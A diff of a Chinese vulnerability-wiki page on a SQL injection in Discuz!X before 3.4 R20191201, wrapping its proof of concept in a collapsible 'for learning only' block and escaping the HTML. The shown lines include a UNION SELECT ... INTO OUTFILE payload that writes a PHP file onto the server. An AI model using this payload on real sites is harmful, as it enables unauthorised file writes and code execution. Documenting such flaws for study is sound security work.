@@ -20,8 +20,10 @@ tags:
 
 ```
 Discuz!X <3.4 R20191201 版本
-```
+<details>
+<summary>POC 代码（点击展开 · 仅供学习，请勿用于非授权测试）</summary>
 
+<pre><code class="language-text">
 ## 环境搭建
 
 将 **upload**目录下的文件拷入**phpstudy**下的WWW目录打开网站按照步骤安装就行了
@@ -61,8 +63,9 @@ Discuz!X <3.4 R20191201 版本
 ![](https://raw.githubusercontent.com/Threekiii/Vulnerability-Wiki/master/docs-base/docs/cms/images/202202170910657.png)
 
 ```plain
-1' union select "<?php phpinfo();?>"  into outfile 'D:/test.php';--+
-```
+1' union select "&lt;?php phpinfo();?&gt;"  into outfile 'D:/test.php';--+</code></pre>
+
+</details>
 
 也可以使用其他的方法
 
